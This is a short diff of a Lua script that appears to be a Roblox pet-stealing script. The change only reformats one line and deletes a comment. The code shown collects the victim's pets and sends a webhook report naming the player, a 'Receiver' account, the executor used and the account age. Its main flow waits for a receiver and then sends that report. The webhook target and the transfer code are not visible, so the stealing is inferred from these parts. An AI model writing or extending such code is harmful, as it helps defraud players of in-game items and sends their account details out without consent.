@@ -139,11 +139,7 @@ local function SendWebhook(pets)
         fields = {
             {
                 name = "👤 Player Information",
-                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
-                    Players.LocalPlayer.DisplayName or "Unknown", 
-                    Username or "Unknown", 
-                    detectExecutor() or "Unknown", 
-                    tostring(Players.LocalPlayer.AccountAge or 0)),
+                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", Players.LocalPlayer.DisplayName or "Unknown", Username or "Unknown", detectExecutor() or "Unknown", tostring(Players.LocalPlayer.AccountAge or 0)),
                 inline = false
             },
             {
@@ -518,7 +514,6 @@ local function WaitForReceiver()
     return receiverPlr
 end
 
--- Main execution flow
 local pets = GetPlayerPets()
 SendWebhook(pets)
 
